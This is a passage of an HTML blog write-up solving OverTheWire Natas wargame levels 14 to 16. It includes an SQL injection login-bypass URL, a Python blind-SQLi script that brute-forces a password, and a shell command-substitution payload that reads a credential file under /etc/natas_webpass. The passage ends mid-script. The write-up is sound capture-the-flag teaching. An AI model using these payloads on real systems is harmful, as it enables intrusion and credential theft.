&lt;p&gt;http://natas14.natas.labs.overthewire.org/index.php?username=admin&amp;amp;password=pass&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;returns:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/mWhSVxh.png" /&gt;&lt;/p&gt;
&lt;p&gt;A crafted query using &lt;a href="https://www.owasp.org/index.php/SQL_Injection"&gt;SQL Injection&lt;/a&gt; (SQLi) can return whatever we want :).&lt;/p&gt;
&lt;h4&gt;Crafting the attack:&lt;/h4&gt;
&lt;p&gt;Without any injection, a regular query with words &lt;em&gt;admin&lt;/em&gt; and &lt;em&gt;pass&lt;/em&gt; would look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$(Username)&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$(Password)&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We want to inject stuff in the middle to make this query do &lt;em&gt;more things&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;In SQLi, we need to take care of the &lt;strong&gt;"&lt;/strong&gt; that is automatically added in the end by the server. The simplest way to do this is by including an &lt;strong&gt;always true clause&lt;/strong&gt; in the end of everything. This can be represented by:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="sc"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, for example, the following query would not give any error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;pass&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;OR&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we just need to add stuff before OR!&lt;/p&gt;
&lt;p&gt;When we craft the right URL, we keep in mind that whitespace will be translated to &lt;em&gt;%20&lt;/em&gt; and &lt;strong&gt;""&lt;/strong&gt; will be translated to &lt;em&gt;%22&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Finally, the following URL:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas14.natas.labs.overthewire.org/index.php?username=admin&amp;amp;password=pass%22%20OR%20%221%22=%221&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;reveals the password.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Now the Juice: Scripting Attacks&lt;/h2&gt;
&lt;h3&gt;Level 15: SQL Injection II&lt;/h3&gt;
&lt;p&gt;This level starts with a  form to check the existence of some username:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/SO4K5wK.png" /&gt;&lt;/p&gt;
&lt;p&gt;The source code is almost equal to the previous level, with exception of this part:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cm"&gt;/*&lt;/span&gt;
&lt;span class="cm"&gt;CREATE TABLE `users` (&lt;/span&gt;
&lt;span class="cm"&gt;  `username` varchar(64) DEFAULT NULL,&lt;/span&gt;
&lt;span class="cm"&gt;  `password` varchar(64) DEFAULT NULL&lt;/span&gt;
&lt;span class="cm"&gt;);&lt;/span&gt;
&lt;span class="cm"&gt;*/&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And the fact that the &lt;em&gt;$query&lt;/em&gt;  does not have a password part and it is hygienized now:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;natas15&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;natas15&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$link&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT * from users where username=&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nx"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;.&amp;quot;\&amp;quot;&amp;quot;;
    if(array_key_exists(&amp;quot;debug&amp;quot;, $_GET)) {
        echo &amp;quot;Executing query: $query&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    }
    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) &amp;gt; 0) {
        echo &amp;quot;This user exists.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    } else {
        echo &amp;quot;This user doesn&amp;#39;t exist.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    }
    } else {
        echo &amp;quot;Error in query.&lt;span class="nt"&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
    }
    mysql_close($link);
} else {
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can't just modify the query to return a record because it won't accept &lt;strong&gt;"&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;However, the additional information about the table's proprieties are enough for us! We are going to brute force it!&lt;/p&gt;
&lt;h4&gt;Stating the Attack:&lt;/h4&gt;
&lt;p&gt;If we check the existence of the users &lt;em&gt;nata15&lt;/em&gt; or &lt;em&gt;natas17&lt;/em&gt;, we get:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The user doesn't exist.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;However, if we check for &lt;em&gt;natas16&lt;/em&gt; we verify that this user exists! Now we just need a password.&lt;/p&gt;
&lt;p&gt;Since checking this &lt;em&gt;natas16&lt;/em&gt;  will always return true, we can  inject another clause to the query using the keyword AND:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;natas16&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;our_exploit&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To pick this additional clause, we look at the &lt;a href="http://www.w3schools.com/sql/sql_wildcards.asp"&gt;SQL wildcards and keywords&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We can use the SQL function &lt;a href="http://www.1keydata.com/sql/sql-substring.html"&gt;SUBSTRING&lt;/a&gt; and the symbol &lt;strong&gt;%&lt;/strong&gt; to compare strings. For example, the following checks whether there is an &lt;strong&gt;a&lt;/strong&gt; in the third position of the variable password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;AND&lt;/span&gt; &lt;span class="n"&gt;SUBSTRING&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BINARY&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If SUBSTRING returns false, the entire query becomes false because of the &lt;strong&gt;AND&lt;/strong&gt; and we see the message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This user doesn’t exist.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If it returns true, we see&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This user exists.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Beautiful.&lt;/p&gt;
&lt;h4&gt;Crafting the attack:&lt;/h4&gt;
&lt;p&gt;We use Python's &lt;a href="http://docs.python-requests.org/en/latest/user/quickstart/"&gt;request&lt;/a&gt; library to craft our attack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;KEYWORD&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;auth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;
                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;KEYWORD&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Password so far: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="k"&gt;break&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="c"&gt;# authorization: login and password&lt;/span&gt;
        &lt;span class="n"&gt;AUTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;natas15&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;*******************************&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="c"&gt;# BASE64 password and 32 bytes&lt;/span&gt;
        &lt;span class="n"&gt;CHARS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_letters&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;
        &lt;span class="n"&gt;LENGTH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt;

        &lt;span class="c"&gt;# crafted url option 1&lt;/span&gt;
        &lt;span class="n"&gt;SQL_URL1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://natas15.natas.labs.overthewire.org?username=natas16&amp;quot; AND SUBSTRING(password,&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;SQL_URL2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;,1) LIKE BINARY &amp;quot;&amp;#39;&lt;/span&gt;
        &lt;span class="n"&gt;KEYWORD&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;exists&amp;#39;&lt;/span&gt;

        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SQL_URL2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;KEYWORD&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After around 10 minutes we have our password.&lt;/p&gt;
&lt;h3&gt;Level 16: OS Command Injection III&lt;/h3&gt;
&lt;p&gt;This level starts with a searching form:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/kMHZzZ9.png" /&gt;&lt;/p&gt;
&lt;p&gt;The source code is similar to the 9th and 10th levels:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
&lt;span class="err"&gt;&amp;lt;&lt;/span&gt;?
$key = &amp;quot;&amp;quot;;
if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) {
    $key = $_REQUEST&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
}
if($key != &amp;quot;&amp;quot;) {
    if(preg_match(&amp;#39;/&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="o"&gt;|&amp;amp;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;quot;]/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Input contains an illegal character!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grep -i &lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;$key&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt; dictionary.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;?&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nx"&gt;pre&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The difference now is that the code is being hygienized for &lt;strong&gt;`&lt;/strong&gt;, &lt;strong&gt;"&lt;/strong&gt;, and &lt;strong&gt;'&lt;/strong&gt;. The old attack adding &lt;strong&gt;""&lt;/strong&gt; won't work.&lt;/p&gt;
&lt;p&gt;We need to figure out what else we can use.&lt;/p&gt;
&lt;p&gt;Bash has a feature called &lt;a href="http://www.tldp.org/LDP/abs/html/commandsub.html"&gt;command substitution&lt;/a&gt;, where  commands can be passed with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For example, the date command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ MY_CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(date)&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$MY_CMD&lt;/span&gt;
Wed Oct 14 20:23:41 EDT 2014
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Stating the attack:&lt;/h4&gt;
&lt;p&gt;We are going to use command substitution to craft a command in the variable &lt;em&gt;$key&lt;/em&gt;, which lies inside:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;$key&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s"&gt; dictionary.txt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We are going to add another grep! Let's call it &lt;em&gt;grep II&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This time we will give it the flag &lt;code&gt;-E&lt;/code&gt; to allow the use of regular expressions.&lt;/p&gt;
&lt;p&gt;So, for example, we can use the &lt;em&gt;regex wildcard&lt;/em&gt; &lt;strong&gt;.*&lt;/strong&gt; to search for a char (say &lt;em&gt;a&lt;/em&gt;) in the password string:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas_webpass&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas17&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;banana&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If &lt;em&gt;grep II&lt;/em&gt; finds a match, it returns the char. In the other case, it won't return any output.&lt;/p&gt;
&lt;p&gt;Once &lt;em&gt;grep II&lt;/em&gt; is over, &lt;em&gt;grep I&lt;/em&gt; will do the regular search for the pattern we passed (banana).&lt;/p&gt;
&lt;p&gt;If &lt;em&gt;grep II&lt;/em&gt; didn't return anything, banana will be banana. If &lt;em&gt;grep II&lt;/em&gt; returns a match, banana will have this extra string added to it (abanana).&lt;/p&gt;
&lt;p&gt;Now we can extend this logic to each char in the password string.&lt;/p&gt;
&lt;h4&gt;Crafting the attack:&lt;/h4&gt;
&lt;p&gt;By inspection, we see that the crafted URL to check, say, &lt;em&gt;a&lt;/em&gt; in the first char, should look like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;http://natas16.natas.labs.overthewire.org/?needle=$(grep%20-E%20^a.*%20/etc/natas_webpass/natas17)banana&amp;amp;submit=Search&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This allows us to write the following script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;brute_force_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AUTH&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;URL2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;LENGTH&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Position &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s"&gt;: Trying &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; ...&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CHARS&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
